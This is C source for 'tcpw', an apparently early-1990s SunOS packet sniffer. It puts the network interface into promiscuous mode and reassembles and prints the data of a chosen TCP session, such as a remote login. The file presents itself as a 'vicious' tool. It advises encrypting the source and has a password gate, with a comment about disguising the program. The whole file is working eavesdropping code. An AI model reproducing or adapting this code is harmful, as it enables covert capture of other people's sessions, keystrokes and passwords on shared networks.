 
/**
 ** version     : v1.01
 ** architecture: SunOS 4.1 [Sun3/Sun4]
 ** compilation : cc -O4 tcpw.c -o tcpw; strip tcpw
 ** source rights: this is an EXTREMELLY VICIOUS program, it is ADVISED
 **     that if you must keep this source online, KEEP IT IN ENCRYPTED
 **     FORM.
 **/

#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <sys/time.h>
#include <sys/file.h>
#include <sys/stropts.h>
#include <sys/signal.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <net/nit_if.h>
#include <net/nit_buf.h>
#include <net/if_arp.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/ip_var.h>
#include <netinet/udp_var.h>
#include <netinet/in_systm.h>
#include <netinet/tcp.h>
#include <netinet/ip_icmp.h>

char *malloc();
char *device;
int debug = 0,			/* debug */
  fastdump = 0,			/* do no sequential packet processing */
  oneway = 0;			/* oneway watch */

char *ProgName;

#define  NIT_DEV  "/dev/nit"
#define  CHUNKSIZE  4096	/* device buffer size */

int if_fd = -1;
int Packet[CHUNKSIZE + 32];

#define  STREAM_NULL  (0)
#define  STREAM_STOD  (1)
#define  STREAM_DTOS  (2)
#define  STREAM_MAX  (3)

struct PktStack {
  u_char data[CHUNKSIZE];
  int Len;
  u_long Seq;
};

#define  STACK_MAX  (10)

struct PktStack pkt_stack[STREAM_MAX][STACK_MAX];
int pkt_snum[STREAM_MAX];
u_long seq_num[STREAM_MAX];
char *Hostname[STREAM_MAX];
struct in_addr IPaddr[STREAM_MAX];
int TCPport[STREAM_MAX];

#define  ISeq(s,d)  ((s) == (d))
#define  ISneq(s,d)  ((s) != (d))

void
Pexit(err, msg)
  int err;
  char *msg;
{
  perror(msg);
  exit(err);
}

void
Zexit(err, msg)
  int err;
  char *msg;
{
  fprintf(stderr, msg);
  exit(err);
}

#define  FREEstk(SK,St,Rc) { \
  SK.Len = (-1); \
  if(!(--pkt_snum[St])) \
    return(Rc); \
  }
#define  ALLOCstk(SK,Len,Data,S,St) { \
  bcopy(Data,SK.data,Len); \
  SK.Len = Len; \
  SK.Seq = S; \
  pkt_snum[St]++; \
  }
#define  pr_packet(p,length) { \
  while(length-- >0) \
  fputc(*p++,stdout); \
  fflush(stdout); \
  }
#define  MAL_pr_packet(i_p,i_length) { \
  register u_char *p = i_p; \
  register int length = i_length; \
  pr_packet(p,length); \
  }
#define  DEBUGstk(Msg,Num,Seq) if(debug) { \
  printf(Msg,Num,Seq); fflush(stdout); \
  }
#define  SPKT  pkt_stack[Tp][i]

/* find and print any packets in the stack IF they are sequential
 * after ours
 */
int
cpr_stack(Tp)
  register int Tp;
{
  register int i, pr = 1;

  while (pr)
    for (pr = i = 0; (i < STACK_MAX) && (!pr); i++) {
      if (ISneq(SPKT.Len, (-1))) {
	if (SPKT.Seq <= seq_num[Tp]) {	/* check for old packets */
	  DEBUGstk("DISCARD(%d/%08X)\n",
		   pkt_snum[Tp], SPKT.Seq);
	  FREEstk(SPKT, Tp, 0);
	} else if (ISeq(SPKT.Seq, (seq_num[Tp] + 1))) {	/* check for ours! */
	  DEBUGstk("POP(%d/%08X\n", pkt_snum[Tp], SPKT.Seq);
	  seq_num[Tp] = SPKT.Seq;
	  MAL_pr_packet(SPKT.data, SPKT.Len);
	  FREEstk(SPKT, Tp, 0);
	  pr = 1;
	}
      }
    }
}

/* push packet onto stack, also checking for overflow, if so, dump
 * the stack [missing packet assumed unrecoverable] */
int
psh_stack(S, Tp, p, Len)
  register u_long S;
  register int Tp, Len;
  register u_char *p;
{
  register
  int i = 0;
  register struct PktStack *PK = NULL;

  for (; (i < STACK_MAX); i++) {
    if (ISneq(SPKT.Len, (-1))) {
      if (ISeq(SPKT.Seq, S))
	return (0);		/* that Seqnum is already on the stack */
    } else if (ISeq(PK, NULL)) {
      PK = &SPKT;
    }
  }
  /* its not on the stack and we got a position for it */
  if (ISneq(PK, NULL)) {
    DEBUGstk("PUSH(%d/%08X)\n", pkt_snum[Tp], S);
    bcopy(p, PK->data, Len);
    PK->Len = Len;
    PK->Seq = S;
    pkt_snum[Tp]++;
    return (0);
  } {
    /* if we reach here, stack is full, assume missing packet is
 * gone forever, so just dump now ..   */
    register int j;
    register u_long CS;

    while (1) {
      j = (STACK_MAX + 2);
      CS = ~(0);		/* determine lowest seq number */
      for (i = 0; (i < STACK_MAX); i++) {
	if (ISneq(SPKT.Len, (-1)) && (SPKT.Seq <= CS)) {
	  CS = SPKT.Seq;
	  j = i;
	}
      }				/* must be nothing in stack */
      if (j > STACK_MAX)
	return (1);		/* print */
      seq_num[Tp] = SPKT.Seq;
      DEBUGstk("FLUSH(%d/%08X)\n", pkt_snum[Tp], SPKT.Seq);
      MAL_pr_packet(SPKT.data, SPKT.Len);
      FREEstk(SPKT, Tp, 1);
    }
  }
}

#define  IP  ((struct ip *)Packet)
#define  IP_OFFSET  (0x1FFF)
#define  SZETH  (sizeof(struct ether_header))
#define  IPLEN  (ntohs(ip->ip_len))
#define  IPHLEN  (ip->ip_hl)
#define  ADneq(s,t)  ((s).s_addr != (t).s_addr)

/* important part of the prog, determines if a packet is one
 * we want, and performs sycnhing of sequence numbers */
void
filter(cp, pktlen)
  char *cp;
  u_int pktlen;
{
  register int Stream = STREAM_NULL;
  register struct ip *ip;
  register struct tcphdr *tcph;
  register u_long CurSEQ;
  register u_char *p;

  {
    register u_short EtherType = ntohs(((struct ether_header *) cp)->ether_type);

    if (EtherType < 0x600) {
      EtherType = *(u_short *) (cp + SZETH + 6);
      cp += 8;
      pktlen -= 8;
    }
    if (ISneq(EtherType, ETHERTYPE_IP))
      return;
  }
  /* ugh, gotta do an alignment :-( */
  bcopy(cp + SZETH, (char *) Packet, (int) (pktlen - SZETH));
  ip = (struct ip *) Packet;
  if (ISneq(ip->ip_p, IPPROTO_TCP))
    return;
  tcph = (struct tcphdr *) (Packet + IPHLEN);
  CurSEQ = (ntohl(tcph->th_seq));
  if (debug) {
    printf("SRC:%s(%d) ", inet_ntoa(ip->ip_src), tcph->th_sport);
    printf("DST:%s(%d)\n", inet_ntoa(ip->ip_dst), tcph->th_dport);
  }
  if (ISeq(tcph->th_sport, TCPport[STREAM_STOD]) &&
      ISeq(tcph->th_dport, TCPport[STREAM_DTOS])) {
    if (ADneq(ip->ip_src, IPaddr[STREAM_STOD]) ||
	ADneq(ip->ip_dst, IPaddr[STREAM_DTOS]))
      return;
    if (!seq_num[Stream = STREAM_STOD]) {
      seq_num[STREAM_STOD] = CurSEQ - 1;
      printf("Hooked S->D [Seq %08X] ...\n", CurSEQ);
    } else if (CurSEQ <= seq_num[STREAM_STOD])
      return;
  } else if ((!oneway) &&
	     ISeq(tcph->th_sport, TCPport[STREAM_DTOS]) &&
	     ISeq(tcph->th_dport, TCPport[STREAM_STOD])) {
    if (ADneq(ip->ip_src, IPaddr[STREAM_DTOS]) ||
	ADneq(ip->ip_dst, IPaddr[STREAM_STOD]))
      return;
    if (!seq_num[Stream = STREAM_DTOS]) {
      seq_num[STREAM_DTOS] = CurSEQ - 1;
      printf("Hooked D->S [Seq %08X] ...\n", CurSEQ);
    } else if (CurSEQ <= seq_num[STREAM_DTOS])
      return;
  } else
    return;
  {
    register int length = ((IPLEN - (IPHLEN * 4)) - (tcph->th_off * 4));

    if (debug)
      printf("[%s]Seq=%08X,pl=%04X,dl=%04X,l=%04X,iph=%04X,ipl=%04X,tf=%04X\n",
	     (Stream == STREAM_STOD) ? " S / D " : " D / S ", CurSEQ, pktlen,
       (IPLEN - (IPHLEN * 4)), length, ip->ip_hl, ip->ip_len, tcph->th_off);
    p = (u_char *) Packet;
    p += ((ip->ip_hl * 4) + (tcph->th_off * 4));
    if (fastdump) {
      pr_packet(p, length);
    } else {
    re_loop:if (ISeq(CurSEQ, (seq_num[Stream] + 1))) {
	seq_num[Stream] = CurSEQ;
	pr_packet(p, length);
	if (pkt_snum[Stream])	/* check for 'stacked' packets */
	  cpr_stack(Stream);
      } else {
	/* out of sequence packet */
	if (psh_stack(CurSEQ, Stream, p, length))
	  goto re_loop;
      }
    }
  }
}

/* signal handler */
void
flushit()
{
  printf("\n\n[terminating]\n");
  fflush(stdout);
  exit(1);
}

/* opens network interface, performs ioctls and reads from it,
 * passing data to filter function */
void
do_it()
{
  int cc;
  char *buf;

  u_short sp_ts_len;

  if (!(buf = malloc(CHUNKSIZE)))
    Pexit(1, "Eth: malloc");
  /* this /dev/nit initialization code pinched from etherfind */  {
    struct strioctl si;
    struct ifreq ifr;
    struct timeval timeout;
    u_int chunksize = CHUNKSIZE;
    u_long if_flags = NI_PROMISC;

    if ((if_fd = open(NIT_DEV, O_RDONLY)) < 0)
      Pexit(1, "Eth: nit open");
    if (ioctl(if_fd, I_SRDOPT, (char *) RMSGD) < 0)
      Pexit(1, "Eth: ioctl (I_SRDOPT)");
    si.ic_timout = INFTIM;
    if (ioctl(if_fd, I_PUSH, "nbuf") < 0)
      Pexit(1, "Eth: ioctl (I_PUSH \"nbuf\")");
    timeout.tv_sec = 1;
    timeout.tv_usec = 0;
    si.ic_cmd = NIOCSTIME;
    si.ic_len = sizeof (timeout);
    si.ic_dp = (char *) &timeout;
    if (ioctl(if_fd, I_STR, (char *) &si) < 0)
      Pexit(1, "Eth: ioctl (I_STR: NIOCSTIME)");
    si.ic_cmd = NIOCSCHUNK;
    si.ic_len = sizeof (chunksize);
    si.ic_dp = (char *) &chunksize;
    if (ioctl(if_fd, I_STR, (char *) &si) < 0)
      Pexit(1, "Eth: ioctl(I_STR:NIOCSCHUNK) ");
    strncpy(ifr.ifr_name, device, sizeof (ifr.ifr_name));
    ifr.ifr_name[sizeof (ifr.ifr_name) - 1] = '\0';
    si.ic_cmd = NIOCBIND;
    si.ic_len = sizeof (ifr);
    si.ic_dp = (char *) &ifr;
    if (ioctl(if_fd, I_STR, (char *) &si) < 0)
      Pexit(1, "Eth: ioctl (I_STR: NIOCBIND)");
    si.ic_cmd = NIOCSFLAGS;
    si.ic_len = sizeof (if_flags);
    si.ic_dp = (char *) &if_flags;
    if (ioctl(if_fd, I_STR, (char *) &si) < 0)
      Pexit(1, "Eth: ioctl (I_STR:    NIOCSFLAGS) ");
    if (ioctl(if_fd, I_FLUSH, (char *) FLUSHR) < 0)
      Pexit(1, "Eth: ioctl (I_FLUSH)");
  }
  while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) {
    register char *bp = buf, *bufstop = (buf + cc);

    while (bp < bufstop) {
      register char *cp = bp;

      register struct nit_bufhdr *hdrp;

      hdrp = (struct nit_bufhdr *) cp;
      cp += sizeof (struct nit_bufhdr);

      bp += hdrp->nhb_totlen;
      filter(cp, (u_long) hdrp->nhb_msglen);
    }
  } Pexit((-1), "Eth: read");
}

/* Parses Hostname/port information */
int
FixHost(h, Tp)
  char *h;
  int Tp;
{
  int ok = 1, i = 0;
  char *ptr;

  if (!(ptr = strtok(h, "/")))
    return (0);
  /* get hostname, convert from symbolic if needed */
  if ((IPaddr[Tp].s_addr = inet_addr(ptr)) == (unsigned) -1) {
    struct hostent *he = gethostbyname(ptr);

    if (he) {
      Hostname[Tp] = strdup(he->h_name);
      bcopy(he->h_addr, (char *) &IPaddr[Tp].
	    s_addr, 4);
    } else
      return (0);
  } else
    Hostname[Tp] = strdup(inet_ntoa(IPaddr[Tp]));
  if (!(ptr = strtok(NULL, "")))
    return (0);
  /* get portname, conver from symbolic if needed */
  if ((TCPport[Tp] = atoi(ptr)) == 0) {
    struct servent *sv = getservbyname(ptr, "tcp");

    if (sv)
      TCPport[Tp] = sv->s_port;
    else
      return (0);
  }
  return (1);
}

#define AUTHPASSWD "EloiZgZejWyms"
/* Important! ensures other people cant (easily) run this program,
 * you may consider removing the HELP text to disguise it.
 */
void
Get_Authorization()
{
  char *buf, *getpass(), *crypt();
  char pwd[21];

  strcpy(pwd, AUTHPASSWD);
  buf = getpass("up? ");
  if (strcmp(pwd, crypt(buf, pwd)))
    exit(1);
}

void
Usage()
{
  fprintf(stderr, "Usage: %s [-i device] [-d] [-o] [-f] SRC.Host/Port DST.Host/Port\n",
	  ProgName);
  fprintf(stderr, "  -o         Oneway [Watch src->dst packets only]\n");
  fprintf(stderr, "  -d         Debug\n");
  fprintf(stderr, "  -f         Fastdump - ignore sequence numbers\n");
  fprintf(stderr, "  -i    device specify logical ethernet interface\n");
  fprintf(stderr, " Host/Port  Hostname with respective port, maybe in\n");
  fprintf(stderr, " numeric or symbolic format.\n\n");
  fprintf(stderr, "  Example:   %s -i le0 -o hack.com/login 128.2.2.2/5645\n", ProgName);
  fprintf(stderr, "             (C)1992 >R  -> AUTHORIZED USE ONLY\n");
  exit(1);
}

/* Where it all begins ... */
void
main(argc, argv)
  int argc;
  char **argv;
{
  char cbuf[BUFSIZ];
  struct ifconf ifc;
  int s, ac = 1;

  ProgName = argv[0];
  if (argc < 3)
    Usage();
  /* Get_Authorization();		/* parse args */
  device = NULL;
  while (argv[ac][0] == '-') {
    register char ch = argv[ac++][1];

    switch (toupper(ch)) {
    case 'I':
      device = argv[ac++];
      break;
    case 'D':
      debug = 1;
      break;
    case 'O':
      oneway = 1;
      break;
    case 'F':
      fastdump = 1;
      break;
    default:
      Usage();
      break;
    }
  }				/* resolve host/ports */
  if (!FixHost(argv[ac++], STREAM_STOD))
    Zexit(1, "Cannot resolve source host/port");
  if (!FixHost(argv[ac++], STREAM_DTOS))
    Zexit(1, "Cannot resolve destination host/port"); {
    register int i, j;

    for (i = 0; i < STREAM_MAX; i++) {
      pkt_snum[i] = 0;
      seq_num[i] = 0;
      for (j = 0; j < STACK_MAX; j++)
	pkt_stack[i][j].Len = -1;
    }
    }				/* if not a specified device, determine it */
    if (!device) {
      if ((s = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	Pexit(1, "Eth: socket");
      ifc.ifc_len = sizeof (cbuf);
      ifc.ifc_buf = cbuf;
      if (ioctl(s, SIOCGIFCONF, (char *) &ifc) < 0)
	Pexit(1, "Eth: ioctl");
      close(s);
      device = ifc.ifc_req->ifr_name;
    }
  printf("IP/TCP monitor: %s(%d) <=> %s(%d)\n", Hostname[STREAM_STOD], TCPport[STREAM_STOD], Hostname[STREAM_DTOS], TCPport[STREAM_DTOS]);
  printf("Configured device %s [%s], %s%s%ssynching stream ...\n", device, NIT_DEV, (debug) ? "(debug) " : "", (oneway) ? "(1way) " : "", (fastdump) ? "(fdmp) " : "");
  fflush(stdout);
  signal(SIGINT, flushit);
  signal(SIGTERM, flushit);
  do_it();			/* NOT_REACHED */
}
